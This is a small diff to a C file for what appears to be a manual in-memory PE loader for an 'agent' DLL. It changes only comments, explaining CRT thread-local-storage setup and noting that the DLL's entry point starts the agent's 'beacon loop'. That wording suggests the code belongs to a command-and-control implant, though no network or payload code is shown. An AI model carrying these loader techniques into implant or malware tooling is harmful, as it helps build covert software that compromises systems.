@@ -10,6 +10,14 @@
  *  - DllMain invocation via CreateThread
  *
  * Supports 64-bit PE only (the agent_dll is x86_64).
+ *
+ * NOTE ON TLS:
+ * The agent DLL's AddressOfEntryPoint is _DllMainCRTStartup (not DllMain
+ * directly).  _DllMainCRTStartup calls _initptd which allocates and sets
+ * up the CRT PE-TLS slot for the calling thread (dll_thread here).
+ * For *other* threads that run DLL code (agent_thread), the DLL itself must
+ * call its entry-point with DLL_THREAD_ATTACH at thread start — this is done
+ * inside agent_thread in lib.rs.
  */
 
 #include "pe_loader.h"
@@ -134,7 +142,9 @@ static DWORD WINAPI dll_thread(LPVOID param) {
     DllThreadParam* p = (DllThreadParam*)param;
     typedef BOOL (WINAPI *DllMain_t)(HMODULE, DWORD, LPVOID);
     DllMain_t dllmain = (DllMain_t)(p->base + p->ep_rva);
-    /* Call DllMain(DLL_PROCESS_ATTACH) — agent starts its beacon loop here */
+    /* Call entry-point (_DllMainCRTStartup) with DLL_PROCESS_ATTACH.
+     * This runs CRT init (_initptd), sets up PE TLS for THIS thread,
+     * then calls user DllMain which spawns agent_thread.              */
     dllmain((HMODULE)p->base, DLL_PROCESS_ATTACH, NULL);
     return 0;
 }
